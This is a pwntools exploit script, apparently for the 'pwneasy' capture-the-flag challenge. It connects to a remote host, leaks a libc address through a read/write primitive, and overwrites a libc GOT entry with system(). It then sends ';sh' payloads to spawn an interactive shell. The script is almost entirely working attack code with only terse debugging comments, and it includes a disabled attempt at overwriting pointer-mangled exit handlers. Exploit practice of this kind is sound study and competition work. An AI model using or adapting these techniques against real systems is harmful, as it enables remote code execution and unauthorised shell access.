#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=easy_pwneasy.zajebistyc.tf' '--port=8010' pwneasy
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pwneasy')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'easy_pwneasy.zajebistyc.tf'
port = int(args.PORT or 8010)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    pfx = ["env", "-i", "/usr/bin/unshare", "-cRchroot", "./pwneasy"]
    if args.GDB:
        return gdb.debug(pfx + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(pfx + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = f'''
catch exec
continue
continue
tbreak main
continue
b *(0x7ffff7dbb000+{args.GADGET})
break execve
continue
'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def rdwr(addr, val):
    io.send(addr)
    io.sendafter(b'give me value:', val)
    io.recvuntil(b'OK ')
    addr = io.recvuntil(b' = ', drop=True)
    val = io.recvuntil(b'\ngive me addr', drop=True)
    return addr, val

def rdwri(addr, val, calib=True):
    if val >= 0x8000_0000_0000_0000:
        val -= 0x1_0000_0000_0000_0000
    io.send((b'%d;sh' % addr).ljust(0x20, b'\0') + (b'%d;sh' % val).ljust(0x20, b'\0'))
    if calib:
        io.recvuntil(b'OK ')
        io.recvuntil(b' = ')
        io.recvuntil(b'\n')

addr, val = rdwr(b'a', b'a')
info('got:\n%s\n%s', hexdump(addr), hexdump(val))
addr = unpack(addr.ljust(context.bytes, b'\0')) - 0x61
val = unpack(val.ljust(context.bytes, b'\0')) - 0x61
info('addr: %#x', addr)
info('val: %#x', val)

libc_base = addr - 0x1f7600
info('libc base: %#x', libc_base)
assert (libc_base & 0xfff) == 0

libc = ELF('libc.so.6')
libc.sym['initial'] = 0x1f8300
libc.sym['__exit_funcs'] = 0x1f6840
libc.address = libc_base

info('initial @ %#x', libc.sym.initial)

# addr = libc ptr
# val = stack ptr
# example:
#   val == 0x50
#   ret_program == 0x28
#   ret_main == 0x98
# -> ret_main is +0x48
# -> ret_program is -0x28
#  ret_main is 0+0x48 ... 0+0xf0+0x48 == 0+0x138
#  ret_program is 0-0x28 ... 0+0xf0-0x28 == 0+0xc8
# both can have value 0+0x48...0+0xc8

*gadg, = map(int, '''
321696 321708 321729 321737 501550 501563 501568 501573 1068522 1068530 1068535 1068545
'''.split())

# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
        ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))


g = libc.sym.system
g = libc.sym.abort
#g = int(args.GADGET or 0) + libc_base
#g = 0xdeadbeef
g = libc_base + 0x226da0

if 0:
    cook = 0x1337
    g = rol(g ^ cook, 0x11, 64)
    ret_addr = libc.sym.initial + 0x18
    info('want to write %#x @ %#x', g, ret_addr)
    rdwri(ret_addr, g)
    pause()
    rdwr(b'%d' % (libc_base - 0x2890), b'%d;sh\0' % cook)  # clear pointer canary

libc_got = libc_base + 0x1f6000
got_entry = libc_got + int(args.GOTOFF or 0) * 8
print(hex(libc_got))
info('want to write %#x @ %#x', libc.sym.system, got_entry)

#targ = libc_base + int(args.GADGET or 0)
targ = libc.sym.system
info('go to %#x', targ)
pause()
rdwri(got_entry, targ, calib=False)
io.send(b';sh'*22)
#io.recvuntil(b'value: ')

io.interactive()
